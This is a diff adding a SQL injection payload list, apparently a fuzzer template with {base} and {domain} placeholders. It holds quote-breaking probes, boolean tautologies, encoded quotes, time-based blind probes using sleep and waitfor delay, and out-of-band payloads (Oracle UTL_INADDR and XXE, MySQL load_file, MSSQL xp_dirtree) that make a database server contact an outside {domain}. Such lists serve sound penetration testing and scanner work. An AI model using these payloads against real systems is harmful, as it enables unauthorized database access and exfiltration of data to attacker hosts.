@@ -1,0 +1,166 @@
+'
+''
+\
+\\
+\'
+{base}-0
+{base}*1
+{base}'||'
+{base}'+'
+{base}' '
+{base}'.'
+{base}','
+"
+""
+\"
+{base}"||"
+{base}"+"
+{base}","
+{base}/*_*/
+{base}/*x*/
+{base}|0
+'{base}'
+"{base}"
+({base})
+{base}'--
+{base}')--
+{base}');-- 
+{base}'))--
+{base}'));-- 
+{base}')))-- 
+{base}')));-- 
+{base}'#
+{base}')#
+{base}');#
+{base}'))#
+{base}'));# 
+{base}')))# 
+{base}"#
+{base}")#
+{base}");#
+' or 'z'='z
+1 or 7=7
+1 and 7=7
+{base} or 7=7
+{base} or 7=7-- 
+{base} or 7=7#
+{base} or 7=7)-- 
+{base} or 7=7)#
+{base}' or 7=7
+{base}' or 7=7-- 
+{base}' or 7=7#
+{base}' or 'z'='z
+{base}' or 'z'='z' or 'a'='b
+{base}'/**/or/**/'z'='z
+{base}' or username like '%
+{base}' or id like '%
+{base}' or user like '%
+{base}' or @version like '%
+{base}' or version() like '%
+{base}') or ('x'='x
+{base}')) or (('x'='x
+{base}' and 7=7
+{base}' and 7=7-- 
+{base}' and 7=7#
+{base}\' and 7=7--
+{base}\' and 7=7#
+" or "z"="z
+{base}" or 7=7
+{base}" or 7=7-- 
+{base}" or 7=7#
+{base}" or "z"="z
+{base}" or "z"="z" or "a"="b
+{base}"/**/or/**/"z"="z
+{base}" or username like "%
+{base}" or id like "%
+{base}" or user like "%
+{base}" or @version like "%
+{base}" or version() like "%
+{base}") or ("x"="x
+{base}")) or (("x"="x
+{base}" and 7=7
+{base}\" and 7=7--
+{base}\" and 7=7#
+(select 1)
+(select from dual)
+(select {base})
+`
+*/
+/*
+-->
+#>
+%27
+%22
+%5c
+À§
+Ä§
+ï¼‡
+À¢
+Ä¢
+ï¼‚
+&apos;
+Åœ
+ï¹¨
+ï¼¼
+{base}||UTL_INADDR.get_host_address('{domain}')
+{base}'||UTL_INADDR.get_host_address('{domain}')||'
+{base}||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM {base}"http://{domain}/ext1">%xxx;]>'),'/l')
+{base}'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM {base}"http://{domain}/ext2">%xxx;]>'),'/l')||'
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+{base} or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+{base} or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+(select load_file('\\\\{domain}\\c'))
+{base}'+(select load_file('\\\\{domain}\\e'))+'
+{base};EXEC master..xp_dirtree '\\{domain}\s'-- 
+1;EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}';EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}'EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}');EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base};EXEC master..xp_dirtree "\\{domain}\s"-- 
+1;EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}";EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}");EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}"='';EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}"='');EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base};DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}' waitfor delay '0:0:20'--
+{base} waitfor delay '0:0:20'--
+',0)waitfor delay'0:0:20'--
+{base}'(select*from(select(sleep(20)))a)'
+{base}' (select*from(select(sleep(20)))a) '
+{base}' and (select*from(select(sleep(20)))a)-- 
+{base},(select*from(select(sleep(20)))a)
+@@version
+{base},@@version
+version()
+{base},version()
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+to_timestamp_tz
+tz_offset
